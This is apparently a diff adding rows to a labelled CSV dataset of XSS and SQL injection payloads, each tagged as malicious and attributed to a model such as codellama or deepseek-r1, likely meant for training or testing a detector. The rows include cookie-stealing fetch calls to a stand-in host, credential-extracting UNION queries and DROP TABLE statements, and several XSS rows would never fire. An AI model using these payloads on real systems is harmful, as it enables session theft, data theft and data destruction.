+"<iframe onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
+"""><video onerror=eval(atob('YWxlcnQoMSk'))>",1,xss,codellama
+"<marquee onclick=""confirm(1)"">",1,xss,codellama
+<body onclick=confirm(1)>,1,xss,codellama
+<a onmouseover=alert(document.domain)>,1,xss,codellama
+"""><object onload=alert(1)>",1,xss,codellama
+<body onmouseover=alert(1)>,1,xss,codellama
+'><iframe ontoggle=alert(1)>,1,xss,codellama
+'><details onfocus=location='//x.io'>,1,xss,codellama
+'><marquee onload=print()>,1,xss,codellama
+"<video onanimationstart=""alert(document.cookie)"">",1,xss,codellama
+"""><details onanimationstart=alert(document.domain)>",1,xss,codellama
+'><video onload=alert(document.cookie)>,1,xss,codellama
+'><a oninput=fetch('//x.io/'+document.cookie)>,1,xss,codellama
+<input onmouseover=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<object onclick=alert(document.cookie)>,1,xss,codellama
+"""><object onanimationstart=print()>",1,xss,codellama
+"<input onanimationstart=""alert(document.domain)"">",1,xss,codellama
+"""><video onanimationstart=confirm(1)>",1,xss,codellama
+"<audio onload=""eval(atob('YWxlcnQoMSk'))"">",1,xss,codellama
+'><div onfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
+<details onanimationstart=alert(1)>,1,xss,codellama
+'><a onload=confirm(1)>,1,xss,codellama
+'><input onload=alert(document.domain)>,1,xss,codellama
+"<div oninput=""confirm(1)"">",1,xss,codellama
+<marquee oninput=alert(document.cookie)>,1,xss,codellama
+'><svg onpointerover=alert(document.domain)>,1,xss,codellama
+<iframe onanimationstart=confirm(1)>,1,xss,codellama
+') AND (SELECT COUNT(*) FROM sessions)>0#,1,sqli,deepseek-r1
+']; DROP TABLE admin-- -,1,sqli,deepseek-r1
+')%09AND%091 BETWEEN 0 AND 9%09#,1,sqli,deepseek-r1
+')/**/AND/**/'a'='a'/**/-- -,1,sqli,deepseek-r1
+"' UNION SELECT token,pwd,first_name,name,user,uid FROM admin--",1,sqli,deepseek-r1
+') UNION SELECT id FROM customers--,1,sqli,deepseek-r1
+'%0aOR%0a'a'='a'%0a-- -,1,sqli,deepseek-r1
+""") AND (SELECT COUNT(*) FROM accounts)>0/*x*/",1,sqli,deepseek-r1
+`%09OR%091=2%09-- -,1,sqli,deepseek-r1
+'	AND	1 BETWEEN 0 AND 9	#,1,sqli,deepseek-r1
+""")%09OR%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
+""") UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL%23",1,sqli,deepseek-r1
+"' UNION SELECT username,role FROM tokens%23",1,sqli,deepseek-r1
+""")/**/OR/**/1 LIKE 1/**//*x*/",1,sqli,deepseek-r1
+`%0aAND%0a0<1%0a#,1,sqli,deepseek-r1
+')%0aOR%0a''=''%0a-- -,1,sqli,deepseek-r1
+'; DROP TABLE staff--,1,sqli,deepseek-r1
+"""%0aAND%0a1 BETWEEN 0 AND 9%0a-- ",1,sqli,deepseek-r1
+`; DROP TABLE orders-- ,1,sqli,deepseek-r1
+""")+OR+''=''+#",1,sqli,deepseek-r1
+`	OR	1=2	/*x*/,1,sqli,deepseek-r1
+`	AND	1 LIKE 1	--,1,sqli,deepseek-r1
+'); SELECT SLEEP(5)#,1,sqli,deepseek-r1
+') OR 0<1 /*x*/,1,sqli,deepseek-r1
+""")/**/AND/**/'a'='a'/**/-- ",1,sqli,deepseek-r1
+'+AND+1 LIKE 1+--,1,sqli,deepseek-r1
+')%0d%0aOR%0d%0a'a'='a'%0d%0a%23,1,sqli,deepseek-r1
+"""+AND+1 LIKE 1+%23",1,sqli,deepseek-r1
+'%0d%0aOR%0d%0a1=1%0d%0a#,1,sqli,deepseek-r1
+"""%0aAND%0a1 BETWEEN 0 AND 9%0a/*x*/",1,sqli,deepseek-r1
+"""); DROP TABLE orders-- ",1,sqli,deepseek-r1
+""")+OR+''=''+%23",1,sqli,deepseek-r1
+' AND (SELECT COUNT(*) FROM members)>0--,1,sqli,deepseek-r1
+`%0aOR%0a0<1%0a-- ,1,sqli,deepseek-r1
+') UNION SELECT NULL-- -,1,sqli,deepseek-r1
+']	AND	1 BETWEEN 0 AND 9	/*x*/,1,sqli,deepseek-r1
+'] AND (SELECT COUNT(*) FROM sessions)>0--,1,sqli,deepseek-r1
+""")	AND	1 BETWEEN 0 AND 9	-- -",1,sqli,deepseek-r1
+` AND (SELECT COUNT(*) FROM orders)>0%23,1,sqli,deepseek-r1
+"' UNION SELECT NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
+""")	OR	1 LIKE 1	-- ",1,sqli,deepseek-r1
+"' UNION SELECT email,last_name,name,password FROM customers%23",1,sqli,deepseek-r1
+"""); DROP TABLE users-- -",1,sqli,deepseek-r1
+""")%0d%0aAND%0d%0a0<1%0d%0a--",1,sqli,deepseek-r1
+'); DROP TABLE admin-- ,1,sqli,deepseek-r1
+`%09OR%091 LIKE 1%09-- -,1,sqli,deepseek-r1
+'%09AND%091 BETWEEN 0 AND 9%09#,1,sqli,deepseek-r1
+']%0d%0aOR%0d%0a1 LIKE 1%0d%0a-- -,1,sqli,deepseek-r1
+"""%0aOR%0a1=2%0a--",1,sqli,deepseek-r1
+') AND (SELECT COUNT(*) FROM sessions)>0/*x*/,1,sqli,deepseek-r1
+""")%0aOR%0a2>1%0a%23",1,sqli,deepseek-r1
+']	AND	'a'='a'	%23,1,sqli,deepseek-r1
+""") AND (SELECT COUNT(*) FROM users)>0--",1,sqli,deepseek-r1
+')+AND+1=2+-- -,1,sqli,deepseek-r1
+""") AND (SELECT COUNT(*) FROM users)>0%23",1,sqli,deepseek-r1
+""" OR 2>1 %23",1,sqli,deepseek-r1
+"""%0aOR%0a1 BETWEEN 0 AND 9%0a-- ",1,sqli,deepseek-r1
+""")+AND+1 LIKE 1+-- -",1,sqli,deepseek-r1
+""")/**/AND/**/1=1/**//*x*/",1,sqli,deepseek-r1
+""") UNION SELECT NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
+`	AND	2>1	-- -,1,sqli,deepseek-r1
+']	OR	''=''	-- ,1,sqli,deepseek-r1
+']%0d%0aAND%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
+`/**/OR/**/1 BETWEEN 0 AND 9/**//*x*/,1,sqli,deepseek-r1
+`%0d%0aOR%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
+`/**/OR/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
+""")%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23",1,sqli,deepseek-r1
+`%09OR%091=1%09-- -,1,sqli,deepseek-r1
+'	OR	2>1	%23,1,sqli,deepseek-r1
+""") AND (SELECT COUNT(*) FROM tokens)>0/*x*/",1,sqli,deepseek-r1
+'] UNION SELECT id FROM customers%23,1,sqli,deepseek-r1
+`%0aAND%0a0<1%0a%23,1,sqli,deepseek-r1
+"""%09OR%091=2%09/*x*/",1,sqli,deepseek-r1
+'/**/OR/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,deepseek-r1
+')%0d%0aOR%0d%0a1=2%0d%0a-- -,1,sqli,deepseek-r1
+` AND (SELECT COUNT(*) FROM sessions)>0--,1,sqli,deepseek-r1
+""")	OR	1=1	#",1,sqli,deepseek-r1
+"""); DROP TABLE staff--",1,sqli,deepseek-r1
+'/**/AND/**/2>1/**/#,1,sqli,deepseek-r1
+""") AND 0<1 /*x*/",1,sqli,deepseek-r1
+')%09AND%092>1%09--,1,sqli,deepseek-r1
+`	AND	1 BETWEEN 0 AND 9	/*x*/,1,sqli,deepseek-r1
+"""/**/OR/**/1 LIKE 1/**/--",1,sqli,deepseek-r1
+`/**/OR/**/1=2/**/#,1,sqli,deepseek-r1
+') OR 1=1 #,1,sqli,deepseek-r1
+'] AND ''='' #,1,sqli,deepseek-r1
+' AND (SELECT COUNT(*) FROM staff)>0%23,1,sqli,deepseek-r1
+']	OR	2>1	#,1,sqli,deepseek-r1
+"""+OR+1=2+-- ",1,sqli,deepseek-r1
+'] AND 1 LIKE 1 #,1,sqli,deepseek-r1
+"` UNION SELECT last_name,id,role,status FROM sessions-- -",1,sqli,deepseek-r1
+"""%0d%0aAND%0d%0a1=1%0d%0a/*x*/",1,sqli,deepseek-r1
+"""%0d%0aOR%0d%0a''=''%0d%0a%23",1,sqli,deepseek-r1
+"""; DROP TABLE sessions#",1,sqli,deepseek-r1
+' AND 1=1 /*x*/,1,sqli,deepseek-r1
+""" OR ''='' #",1,sqli,deepseek-r1
+`; DROP TABLE admin%23,1,sqli,deepseek-r1
+""" UNION SELECT id,uid FROM members%23",1,sqli,deepseek-r1
+""")	OR	1=2	--",1,sqli,deepseek-r1
+`/**/AND/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
+""")	AND	2>1	-- ",1,sqli,deepseek-r1
+` AND 'a'='a' %23,1,sqli,deepseek-r1
+""")%09OR%091 LIKE 1%09/*x*/",1,sqli,deepseek-r1
+` AND (SELECT COUNT(*) FROM credentials)>0/*x*/,1,sqli,deepseek-r1
+"""; DROP TABLE admin/*x*/",1,sqli,deepseek-r1
+""") OR (SELECT user FROM tokens WHERE user=618)=610",1,sqli,deepseek-r1
+'	OR	2>1	#,1,sqli,deepseek-r1
+` UNION SELECT NULL/*x*/,1,sqli,deepseek-r1
+'	OR	'a'='a'	-- -,1,sqli,deepseek-r1
+"""	OR	''=''	-- ",1,sqli,deepseek-r1
+"""%09AND%091 BETWEEN 0 AND 9%09-- ",1,sqli,deepseek-r1
+')	OR	1 BETWEEN 0 AND 9	-- ,1,sqli,deepseek-r1
+`+OR+1=1+/*x*/,1,sqli,deepseek-r1
+"') UNION SELECT name,account,email FROM orders#",1,sqli,deepseek-r1
+'	AND	0<1	#,1,sqli,deepseek-r1
+""")	OR	2>1	%23",1,sqli,deepseek-r1
+""")/**/OR/**/0<1/**/--",1,sqli,deepseek-r1
+"""%09OR%092>1%09-- ",1,sqli,deepseek-r1
+' AND 1=1 -- ,1,sqli,deepseek-r1
+`/**/OR/**/1 LIKE 1/**/%23,1,sqli,deepseek-r1
+""")%0aOR%0a2>1%0a-- -",1,sqli,deepseek-r1
+`; SELECT SLEEP(5)/*x*/,1,sqli,deepseek-r1
+']/**/AND/**/''=''/**/#,1,sqli,deepseek-r1
+"') AND extractvalue(1,concat(0x7e,(SELECT password FROM customers LIMIT 1)))",1,sqli,deepseek-r1
+"""/**/OR/**/1=1/**/-- -",1,sqli,deepseek-r1
+') AND 1 BETWEEN 0 AND 9 %23,1,sqli,deepseek-r1
+""") AND extractvalue(1,concat(0x7e,(SELECT user FROM staff LIMIT 1)))",1,sqli,deepseek-r1
+') OR 1=1 LIMIT 1-- ,1,sqli,deepseek-r1
+""")/**/OR/**/'a'='a'/**/%23",1,sqli,deepseek-r1
+'+OR+1 LIKE 1+/*x*/,1,sqli,deepseek-r1
+"""+OR+''=''+-- -",1,sqli,deepseek-r1
+""") OR (SELECT name FROM orders WHERE name=841)=906",1,sqli,deepseek-r1
+'] OR (SELECT token FROM credentials WHERE token=136)=953,1,sqli,deepseek-r1
+']%0aAND%0a1=2%0a-- ,1,sqli,deepseek-r1
+"""+AND+''=''+-- ",1,sqli,deepseek-r1
+""") AND (SELECT COUNT(*) FROM tokens)>0-- -",1,sqli,deepseek-r1
+'/**/OR/**/''=''/**/-- -,1,sqli,deepseek-r1
+`%09OR%091 BETWEEN 0 AND 9%09/*x*/,1,sqli,deepseek-r1
+"""; DROP TABLE admin#",1,sqli,deepseek-r1
+'] OR ''='' -- ,1,sqli,deepseek-r1
+"""%09AND%09''=''%09--",1,sqli,deepseek-r1
+"` UNION SELECT NULL,NULL,NULL#",1,sqli,deepseek-r1
+"""/**/AND/**/1=2/**//*x*/",1,sqli,deepseek-r1
+"""	AND	0<1	/*x*/",1,sqli,deepseek-r1
+')/**/AND/**/1 LIKE 1/**/#,1,sqli,deepseek-r1
+'	OR	1=1	-- ,1,sqli,deepseek-r1
+']%0aAND%0a1=1%0a--,1,sqli,deepseek-r1
+')%09AND%092>1%09%23,1,sqli,deepseek-r1
+""")/**/OR/**/''=''/**/--",1,sqli,deepseek-r1
+""") UNION SELECT NULL,NULL#",1,sqli,deepseek-r1
+')	AND	1=2	-- -,1,sqli,deepseek-r1
+""" OR 1 LIKE 1 -- ",1,sqli,deepseek-r1
+""") AND 2>1 -- ",1,sqli,deepseek-r1
+"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a-- ",1,sqli,deepseek-r1
+""" AND 1 LIKE 1 --",1,sqli,deepseek-r1
+"""%09AND%09'a'='a'%09--",1,sqli,deepseek-r1
+']%0aOR%0a1 BETWEEN 0 AND 9%0a--,1,sqli,deepseek-r1
+"') UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",1,sqli,deepseek-r1
+`%0d%0aAND%0d%0a1=1%0d%0a%23,1,sqli,deepseek-r1
+'; DROP TABLE orders%23,1,sqli,deepseek-r1
+')	OR	1 BETWEEN 0 AND 9	-- -,1,sqli,deepseek-r1
+')+OR+1=1+-- ,1,sqli,deepseek-r1
+`%0aAND%0a2>1%0a/*x*/,1,sqli,deepseek-r1
+' OR 1 LIKE 1 --,1,sqli,deepseek-r1
+"""	OR	''=''	/*x*/",1,sqli,deepseek-r1
+"` UNION SELECT role,account FROM accounts--",1,sqli,deepseek-r1
+""") AND ''='' /*x*/",1,sqli,deepseek-r1
+"'] UNION SELECT account,role,email FROM staff#",1,sqli,deepseek-r1
+`%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,deepseek-r1
+"""%09OR%091=1%09-- -",1,sqli,deepseek-r1
+"""%0d%0aAND%0d%0a''=''%0d%0a#",1,sqli,deepseek-r1
+`/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,deepseek-r1
+']/**/AND/**/2>1/**/-- -,1,sqli,deepseek-r1
+""") OR 2>1 /*x*/",1,sqli,deepseek-r1
+`+OR+1 BETWEEN 0 AND 9+/*x*/,1,sqli,deepseek-r1
+'] AND 2>1 #,1,sqli,deepseek-r1
+'] OR 0<1 #,1,sqli,deepseek-r1
+"""%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -",1,sqli,deepseek-r1
+'/**/AND/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
+""")/**/OR/**/0<1/**/#",1,sqli,deepseek-r1
+`	AND	1=2	/*x*/,1,sqli,deepseek-r1
+'%09AND%092>1%09/*x*/,1,sqli,deepseek-r1
+' AND (SELECT COUNT(*) FROM admin)>0/*x*/,1,sqli,deepseek-r1
+')/**/OR/**/'a'='a'/**//*x*/,1,sqli,deepseek-r1
+"""%09OR%091=2%09#",1,sqli,deepseek-r1
+"') UNION SELECT email,pwd,password,id,token FROM admin#",1,sqli,deepseek-r1
+""" OR 0<1 -- -",1,sqli,deepseek-r1
+'%09AND%09''=''%09--,1,sqli,deepseek-r1
+']%0aAND%0a'a'='a'%0a-- ,1,sqli,deepseek-r1
+""")%09OR%091=1%09-- ",1,sqli,deepseek-r1
+""")/**/OR/**/2>1/**//*x*/",1,sqli,deepseek-r1
+""")%0aOR%0a1=1%0a/*x*/",1,sqli,deepseek-r1
+']%09AND%090<1%09%23,1,sqli,deepseek-r1
+']+OR+''=''+--,1,sqli,deepseek-r1
+"` UNION SELECT NULL,NULL,NULL-- -",1,sqli,deepseek-r1
+')	OR	''=''	#,1,sqli,deepseek-r1
+"""+OR+0<1+-- ",1,sqli,deepseek-r1
+`%0d%0aAND%0d%0a1=2%0d%0a--,1,sqli,deepseek-r1
+'	AND	''=''	-- -,1,sqli,deepseek-r1
+'; DROP TABLE sessions/*x*/,1,sqli,deepseek-r1
+"` AND extractvalue(1,concat(0x7e,(SELECT last_name FROM tokens LIMIT 1)))",1,sqli,deepseek-r1
+`+AND+'a'='a'+/*x*/,1,sqli,deepseek-r1
+'	AND	1=1	%23,1,sqli,deepseek-r1
+'/**/OR/**/1=1/**/%23,1,sqli,deepseek-r1
+""")+AND+'a'='a'+--",1,sqli,deepseek-r1
+']%0d%0aAND%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
+"') AND extractvalue(1,concat(0x7e,(SELECT account FROM members LIMIT 1)))",1,sqli,deepseek-r1
+""" OR (SELECT last_name FROM accounts WHERE last_name=224)=71",1,sqli,deepseek-r1
+']%0aAND%0a0<1%0a--,1,sqli,deepseek-r1
+""") OR (SELECT pwd FROM sessions WHERE pwd=946)=611",1,sqli,deepseek-r1
+') OR (SELECT email FROM users WHERE email=250)=785,1,sqli,deepseek-r1
+'	OR	''=''	-- ,1,sqli,deepseek-r1
+""") OR (SELECT account FROM tokens WHERE account=532)=357",1,sqli,deepseek-r1
+` AND 0<1 --,1,sqli,deepseek-r1
+']%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,deepseek-r1
+""")%0aOR%0a''=''%0a--",1,sqli,deepseek-r1
+"""%09OR%091 LIKE 1%09-- -",1,sqli,deepseek-r1
+""")%0aOR%0a1=2%0a--",1,sqli,deepseek-r1
+']/**/AND/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,deepseek-r1
+`%0aOR%0a0<1%0a#,1,sqli,deepseek-r1
+"'] UNION SELECT name,uid,pwd FROM staff/*x*/",1,sqli,deepseek-r1
+""") OR 1=1 LIMIT 1--",1,sqli,deepseek-r1
+')+OR+1 LIKE 1+%23,1,sqli,deepseek-r1
+`%09AND%092>1%09/*x*/,1,sqli,deepseek-r1
+`	AND	1 BETWEEN 0 AND 9	#,1,sqli,deepseek-r1
+""") UNION SELECT name,password,user,pwd FROM admin#",1,sqli,deepseek-r1
+' OR 2>1 -- -,1,sqli,deepseek-r1
+')%0aAND%0a'a'='a'%0a/*x*/,1,sqli,deepseek-r1
+']%09AND%091=2%09#,1,sqli,deepseek-r1
+"""	OR	1=2	--",1,sqli,deepseek-r1
+']%09OR%092>1%09-- -,1,sqli,deepseek-r1
+""")	OR	1 LIKE 1	--",1,sqli,deepseek-r1
+')%09OR%09'a'='a'%09--,1,sqli,deepseek-r1
+""") OR (SELECT token FROM credentials WHERE token=776)=800",1,sqli,deepseek-r1
+'+AND+1=1+--,1,sqli,deepseek-r1
+'); DROP TABLE staff/*x*/,1,sqli,deepseek-r1
+""")%0d%0aOR%0d%0a'a'='a'%0d%0a/*x*/",1,sqli,deepseek-r1
+"') UNION SELECT name,account FROM users-- -",1,sqli,deepseek-r1
+']/**/OR/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,deepseek-r1
+"""	AND	'a'='a'	--",1,sqli,deepseek-r1
+']+OR+2>1+%23,1,sqli,deepseek-r1
+`%0d%0aAND%0d%0a0<1%0d%0a-- ,1,sqli,deepseek-r1
+' AND 1=2 /*x*/,1,sqli,deepseek-r1
+`%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -,1,sqli,deepseek-r1
+') OR 2>1 #,1,sqli,deepseek-r1
+')%0aAND%0a1=1%0a#,1,sqli,deepseek-r1
+"') UNION SELECT email,role,name,last_name,status,id FROM members/*x*/",1,sqli,deepseek-r1
+'%0d%0aAND%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
+"""+AND+1=2+-- ",1,sqli,deepseek-r1
+"""/**/AND/**/'a'='a'/**/--",1,sqli,deepseek-r1
+`/**/AND/**/1=2/**/#,1,sqli,deepseek-r1
+"""%0d%0aOR%0d%0a'a'='a'%0d%0a-- ",1,sqli,deepseek-r1
+""")%0aAND%0a'a'='a'%0a-- ",1,sqli,deepseek-r1
+""")	AND	1 BETWEEN 0 AND 9	-- ",1,sqli,deepseek-r1
+""" UNION SELECT NULL,NULL,NULL,NULL-- ",1,sqli,deepseek-r1
+`/**/AND/**/1=1/**//*x*/,1,sqli,deepseek-r1
+'%0aOR%0a0<1%0a-- ,1,sqli,deepseek-r1
+')%0d%0aAND%0d%0a2>1%0d%0a-- -,1,sqli,deepseek-r1
+""")%0aAND%0a1 LIKE 1%0a/*x*/",1,sqli,deepseek-r1
+"""%0aOR%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
+')%0d%0aAND%0d%0a''=''%0d%0a-- ,1,sqli,deepseek-r1
+"""%09OR%092>1%09%23",1,sqli,deepseek-r1
+`/**/AND/**/1 LIKE 1/**/--,1,sqli,deepseek-r1
+""") OR 0<1 --",1,sqli,deepseek-r1
+"""; DROP TABLE members#",1,sqli,deepseek-r1
+""")	AND	1 LIKE 1	--",1,sqli,deepseek-r1
+')%0d%0aAND%0d%0a2>1%0d%0a--,1,sqli,deepseek-r1
+'/**/AND/**/''=''/**/#,1,sqli,deepseek-r1
+')%0aAND%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,deepseek-r1
+""" UNION SELECT NULL,NULL,NULL%23",1,sqli,deepseek-r1
+""") UNION SELECT NULL,NULL%23",1,sqli,deepseek-r1
+"'] UNION SELECT uid,role,username,email,first_name FROM members-- -",1,sqli,deepseek-r1
+')+OR+1=2+--,1,sqli,deepseek-r1
+"""%09OR%09'a'='a'%09-- -",1,sqli,deepseek-r1
+']+OR+2>1+#,1,sqli,deepseek-r1
+` OR 1=1 LIMIT 1--,1,sqli,deepseek-r1
+"'] UNION SELECT NULL,NULL-- ",1,sqli,deepseek-r1
+'%0aOR%0a1 BETWEEN 0 AND 9%0a#,1,sqli,deepseek-r1
+')+OR+1 BETWEEN 0 AND 9+-- -,1,sqli,deepseek-r1
+""")%09AND%091=2%09/*x*/",1,sqli,deepseek-r1
+'%0d%0aAND%0d%0a'a'='a'%0d%0a%23,1,sqli,deepseek-r1
+')%0aAND%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
+' AND (SELECT COUNT(*) FROM users)>0%23,1,sqli,deepseek-r1
+"""%0aAND%0a1=1%0a/*x*/",1,sqli,deepseek-r1
+`+OR+1 BETWEEN 0 AND 9+-- ,1,sqli,deepseek-r1
+""") AND extractvalue(1,concat(0x7e,(SELECT name FROM accounts LIMIT 1)))",1,sqli,deepseek-r1
+""" AND (SELECT COUNT(*) FROM orders)>0/*x*/",1,sqli,deepseek-r1
+']%0d%0aAND%0d%0a''=''%0d%0a-- -,1,sqli,deepseek-r1
+"') UNION SELECT NULL,NULL#",1,sqli,deepseek-r1
+"') UNION SELECT NULL,NULL-- ",1,sqli,deepseek-r1
+' AND 0<1 #,1,sqli,deepseek-r1
+')/**/AND/**/0<1/**//*x*/,1,sqli,deepseek-r1
+"""%09AND%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
+` AND ''='' -- -,1,sqli,deepseek-r1
+""" AND (SELECT COUNT(*) FROM staff)>0-- ",1,sqli,deepseek-r1
+` AND (SELECT COUNT(*) FROM sessions)>0/*x*/,1,sqli,deepseek-r1
+')%0aOR%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
+""")%0aAND%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
+"' UNION SELECT role,username FROM orders/*x*/",1,sqli,deepseek-r1
+""")%09AND%091 LIKE 1%09-- ",1,sqli,deepseek-r1
+<object ontoggle=location='//x.io'>,1,xss,deepseek-r1
+"""><div onload=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+"""><iframe onpointerover=print()>",1,xss,deepseek-r1
+'><marquee onpointerover=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+'><a ontoggle=confirm(1)>,1,xss,deepseek-r1
+"""><details onfocus=fetch('//x.io/'+document.cookie)>",1,xss,deepseek-r1
+"<svg onfocus=""location='//x.io'"">",1,xss,deepseek-r1
+'><svg onmouseover=location='//x.io'>,1,xss,deepseek-r1
+"""><svg ontoggle=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+<iframe onload=alert(1)>,1,xss,deepseek-r1
+'><audio oninput=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+<details onload=alert(document.cookie)>,1,xss,deepseek-r1
+<input onstart=alert(1)>,1,xss,deepseek-r1
+"<input onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+"<div onload=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+<div onfocus=alert(1)>,1,xss,deepseek-r1
+"<img onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+"<audio onstart=""location='//x.io'"">",1,xss,deepseek-r1
+<iframe ontoggle=location='//x.io'>,1,xss,deepseek-r1
+"""><iframe onmouseover=print()>",1,xss,deepseek-r1
+'><div onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+"""><iframe onanimationstart=alert(document.domain)>",1,xss,deepseek-r1
+"""><a onfocus=confirm(1)>",1,xss,deepseek-r1
+"<iframe onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+<video onpointerover=location='//x.io'>,1,xss,deepseek-r1
+<a ontoggle=alert(document.domain)>,1,xss,deepseek-r1
+"<audio oninput=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+<marquee onerror=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+'><a onanimationstart=alert(document.cookie)>,1,xss,deepseek-r1
+<scr<script>ipt>fetch('//x.io/'+document.cookie)</script>,1,xss,deepseek-r1
+"<video onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+<div onfocus=confirm(1)>,1,xss,deepseek-r1
+"""><div onerror=alert(document.domain)>",1,xss,deepseek-r1
+'><details onload=print()>,1,xss,deepseek-r1
+"<script onerror=""alert(1)"">",1,xss,deepseek-r1
+'><div ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,deepseek-r1
+<script onfocus=alert(1)>,1,xss,deepseek-r1
+"""><iframe onload=alert(document.cookie)>",1,xss,deepseek-r1
+'><input onpointerover=alert(1)>,1,xss,deepseek-r1
+'><input oninput=alert(document.cookie)>,1,xss,deepseek-r1
+<input oninput=alert(document.domain)>,1,xss,deepseek-r1
+"<body onanimationstart=""location='//x.io'"">",1,xss,deepseek-r1
+"<a onmouseover=""alert(document.cookie)"">",1,xss,deepseek-r1
+"<audio onclick=""alert(document.domain)"">",1,xss,deepseek-r1
+"<script onmouseover=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+<scr<script>ipt>location='//x.io'</script>,1,xss,deepseek-r1
+"""><video onload=alert(1)>",1,xss,deepseek-r1
+"<div onmouseover=""location='//x.io'"">",1,xss,deepseek-r1
+'><body onclick=alert(1)>,1,xss,deepseek-r1
+<iframe onclick=alert(1)>,1,xss,deepseek-r1
+<details onload=location='//x.io'>,1,xss,deepseek-r1
+'><object onmouseover=location='//x.io'>,1,xss,deepseek-r1
+"""><iframe ontoggle=print()>",1,xss,deepseek-r1
+'><script onerror=confirm(1)>,1,xss,deepseek-r1
+"<script onmouseover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+"""><iframe onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+"""><iframe onstart=print()>",1,xss,deepseek-r1
+<iframe onstart=location='//x.io'>,1,xss,deepseek-r1
+"""><details onmouseover=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
+"<details onanimationstart=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+<input onerror=confirm(1)>,1,xss,deepseek-r1
+"<div onpointerover=""fetch('//x.io/'+document.cookie)"">",1,xss,deepseek-r1
+"<object onanimationstart=""alert(1)"">",1,xss,deepseek-r1
+"""><svg onmouseover=confirm(1)>",1,xss,deepseek-r1
+"""><div oninput=alert(document.cookie)>",1,xss,deepseek-r1
+"<video onclick=""alert(document.cookie)"">",1,xss,deepseek-r1
+"""><body onerror=alert(document.domain)>",1,xss,deepseek-r1
+"<img onclick=""location='//x.io'"">",1,xss,deepseek-r1
+"""><svg ontoggle=confirm(1)>",1,xss,deepseek-r1
+'><marquee onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+<iframe onmouseover=location='//x.io'>,1,xss,deepseek-r1
+"<input onfocus=""eval(atob('YWxlcnQoMSk'))"">",1,xss,deepseek-r1
+'><details oninput=alert(document.domain)>,1,xss,deepseek-r1
+'><div onload=alert(1)>,1,xss,deepseek-r1
+"<iframe onpointerover=""alert(document.domain)"">",1,xss,deepseek-r1
+"<audio onerror=""print()"">",1,xss,deepseek-r1
+"<details onmouseover=""alert(document.domain)"">",1,xss,deepseek-r1
+"<img onanimationstart=""alert(document.domain)"">",1,xss,deepseek-r1
+"""><input onmouseover=print()>",1,xss,deepseek-r1
+'><details onanimationstart=location='//x.io'>,1,xss,deepseek-r1
+'><iframe onpointerover=confirm(1)>,1,xss,deepseek-r1
+"<object onerror=""print()"">",1,xss,deepseek-r1
+"""><iframe onclick=location='//x.io'>",1,xss,deepseek-r1
+'><audio onanimationstart=alert(document.cookie)>,1,xss,deepseek-r1
+"""><video onmouseover=location='//x.io'>",1,xss,deepseek-r1
+<img onpointerover=alert(document.cookie)>,1,xss,deepseek-r1
+"""><details onload=print()>",1,xss,deepseek-r1
+<div onstart=alert(document.cookie)>,1,xss,deepseek-r1
+'><input onpointerover=alert(document.domain)>,1,xss,deepseek-r1
+<details onfocus=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+'><input onanimationstart=confirm(1)>,1,xss,deepseek-r1
+"<marquee onload=""print()"">",1,xss,deepseek-r1
+'><marquee ontoggle=fetch('//x.io/'+document.cookie)>,1,xss,deepseek-r1
+"<details onload=""location='//x.io'"">",1,xss,deepseek-r1
+"<object onpointerover=""alert(1)"">",1,xss,deepseek-r1
+"<script onstart=""confirm(1)"">",1,xss,deepseek-r1
+"""><audio onanimationstart=eval(atob('YWxlcnQoMSk'))>",1,xss,deepseek-r1
